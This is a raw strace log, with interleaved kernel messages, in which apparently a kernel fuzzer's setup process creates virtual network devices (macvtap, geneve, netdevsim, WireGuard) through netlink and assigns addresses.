[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_macvtap", ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x03\x00\x6d\x61\x63\x76\x74\x61\x70\x30\x10\x00\x12\x00\x0b\x00\x01\x00\x6d\x61\x63\x76\x74\x61\x70\x00\x08\x00\x05\x00\x3e\x00\x00\x00"], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_macvtap", ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x6d\x61\x63\x73\x65\x63\x30\x00\x10\x00\x12\x00\x0a\x00\x01\x00\x6d\x61\x63\x73\x65\x63\x00\x00\x08\x00\x05\x00\x3d\x00\x00\x00"], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x67\x65\x6e\x65\x76\x65\x30\x00\x24\x00\x12\x00\x0a\x00\x01\x00\x67\x65\x6e\x65\x76\x65\x00\x00\x14\x00\x02\x00\x08\x00\x01\x00\x00\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x18"], 80, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 80
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=92, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x67\x65\x6e\x65\x76\x65\x31\x00\x30\x00\x12\x00\x0a\x00\x01\x00\x67\x65\x6e\x65\x76\x65\x00\x00\x20\x00\x02\x00\x08\x00\x01\x00\x01\x00\x00\x00\x14\x00\x07\x00\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"], 92, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 92
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=92, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] openat(AT_FDCWD, "/sys/bus/netdevsim/del_device", O_WRONLY|O_CLOEXEC) = 4
[pid  5086] write(4, "0", 1)            = -1 ENOENT (No such file or directory)
[pid  5086] close(4)                    = 0
[pid  5086] openat(AT_FDCWD, "/sys/bus/netdevsim/new_device", O_WRONLY|O_CLOEXEC) = 4
[pid  5086] write(4, "0 4", 3)          = 3
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC) = 4
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 5
[pid  5086] sendto(4, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x03\x00\x00\x00\x0c\x00\x02\x00\x64\x65\x76\x6c\x69\x6e\x6b\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(4, [{nlmsg_len=1216, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, "\x01\x02\x00\x00\x0c\x00\x02\x00\x64\x65\x76\x6c\x69\x6e\x6b\x00\x06\x00\x01\x00\x17\x00\x00\x00\x08\x00\x03\x00\x01\x00\x00\x00\x08\x00\x04\x00\x00\x00\x00\x00\x08\x00\x05\x00\xb3\x00\x00\x00\x64\x04\x06\x00\x14\x00\x01\x00\x08\x00\x01\x00\x01\x00\x00\x00\x08\x00\x02\x00\x0e\x00\x00\x00\x14\x00\x02\x00\x08\x00\x01\x00\x05\x00\x00\x00\x08\x00\x02\x00\x0e\x00\x00\x00\x14\x00\x03\x00\x08\x00\x01\x00"...], 4096, 0, NULL, NULL) = 1216
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=52, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x300, nlmsg_seq=0, nlmsg_pid=0}, "\x05\x00\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00"], 52, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 52
[pid  5086] recvfrom(4, [[{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, "\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x00\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x43\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x30\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x01\x00\x00\x00"], [{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, "\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x01\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x44\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x31\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x02\x00\x00\x00"], [{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, "\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x02\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x45\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x32\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x03\x00\x00\x00"], [{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, "\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x03\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x46\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x33\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x04\x00\x00\x00"], [{nlmsg_len=20, nlmsg_type=NLMSG_DONE, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, 0]], 4096, 0, NULL, NULL) = 468
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name="eth0", ifr_ifindex=67}) = 0
[pid  5086] close(6)                    = 0
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x43\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00"], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name="eth1", ifr_ifindex=68}) = 0
[pid  5086] close(6)                    = 0
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x44\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x31\x00\x00"], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name="eth2", ifr_ifindex=69}) = 0
[pid  5086] close(6)                    = 0
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x45\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x32\x00\x00"], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name="eth3", ifr_ifindex=70}) = 0
[pid  5086] close(6)                    = 0
[   76.491183][ T5086] netdevsim netdevsim0 netdevsim0: renamed from eth0
[   76.512406][ T5086] netdevsim netdevsim0 netdevsim1: renamed from eth1
[   76.529388][ T5086] netdevsim netdevsim0 netdevsim2: renamed from eth2
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x46\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x33\x00\x00"], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(5)                    = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC) = 4
[pid  5086] sendto(4, [{nlmsg_len=36, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x03\x00\x00\x00\x0e\x00\x02\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00"], 36, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 36
[pid  5086] recvfrom(4, [{nlmsg_len=112, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, "\x01\x02\x00\x00\x0e\x00\x02\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00\x06\x00\x01\x00\x26\x00\x00\x00\x08\x00\x03\x00\x01\x00\x00\x00\x08\x00\x04\x00\x00\x00\x00\x00\x08\x00\x05\x00\x08\x00\x00\x00\x2c\x00\x06\x00\x14\x00\x01\x00\x08\x00\x01\x00\x00\x00\x00\x00\x08\x00\x02\x00\x1c\x00\x00\x00\x14\x00\x02\x00\x08\x00\x01\x00\x01\x00\x00\x00\x08\x00\x02\x00\x1a\x00\x00\x00"], 4096, 0, NULL, NULL) = 112
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=36, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x01\x01\x00\x00\x08\x00\x02\x00\x77\x67\x30\x00\x24\x00\x03\x00\xa0\x5c\xa8\x4f\x6c\x9c\x8e\x38\x53\xe2\xfd\x7a\x70\xae\x0f\xb2\x0f\xa1\x52\x60\x0c\xb0\x08\x45\x17\x4f\x08\x07\x6f\x8d\x78\x43\x06\x00\x06\x00\x21\x4e\x00\x00\x28\x01\x08\x80\x8c\x00\x00\x80\x24\x00\x01\x00\xd1\x73\x28\x99\xf6\x11\xcd\x89\x94\x03\x4d\x7f\x41\x3d\xc9\x57\x63\x0e\x54\x93\xc2\x85\xac\xa4\x00\x65\xcb\x63\x11\xbe\x69\x6b"...], 368, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 368
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x01\x01\x00\x00\x08\x00\x02\x00\x77\x67\x31\x00\x24\x00\x03\x00\xb0\x80\x73\xe8\xd4\x4e\x91\xe3\xda\x92\x2c\x22\x43\x82\x44\xbb\x88\x5c\x69\xe2\x69\xc8\xe9\xd8\x35\xb1\x14\x29\x3a\x4d\xdc\x6e\x06\x00\x06\x00\x22\x4e\x00\x00\x28\x01\x08\x80\x98\x00\x00\x80\x24\x00\x01\x00\x97\x5c\x9d\x81\xc9\x83\xc8\x20\x9e\xe7\x81\x25\x4b\x89\x9f\x8e\xd9\x25\xae\x9f\x09\x23\xc2\x3c\x62\xf5\x3c\x57\xcd\xbf\x69\x1c"...], 368, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 368
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x01\x01\x00\x00\x08\x00\x02\x00\x77\x67\x32\x00\x24\x00\x03\x00\xa0\xcb\x87\x9a\x47\xf5\xbc\x64\x4c\x0e\x69\x3f\xa6\xd0\x31\xc7\x4a\x15\x53\xb6\xe9\x01\xb9\xff\x2f\x51\x8c\x78\x04\x2f\xb5\x42\x06\x00\x06\x00\x23\x4e\x00\x00\x28\x01\x08\x80\x98\x00\x00\x80\x24\x00\x01\x00\x97\x5c\x9d\x81\xc9\x83\xc8\x20\x9e\xe7\x81\x25\x4b\x89\x9f\x8e\xd9\x25\xae\x9f\x09\x23\xc2\x3c\x62\xf5\x3c\x57\xcd\xbf\x69\x1c"...], 368, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 368
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="lo", ifr_ifindex=1}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x01\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0a\x08\x00\x01\x00\xac\x14\x14\x0a"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="lo", ifr_ifindex=1}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x01\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="lo", ifr_ifindex=1}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x0a\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="sit0", ifr_ifindex=8}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x08\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0b\x08\x00\x01\x00\xac\x14\x14\x0b"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="sit0", ifr_ifindex=8}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x08\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[   76.543547][ T5086] netdevsim netdevsim0 netdevsim3: renamed from eth3
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="sit0", ifr_ifindex=8}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge0", ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
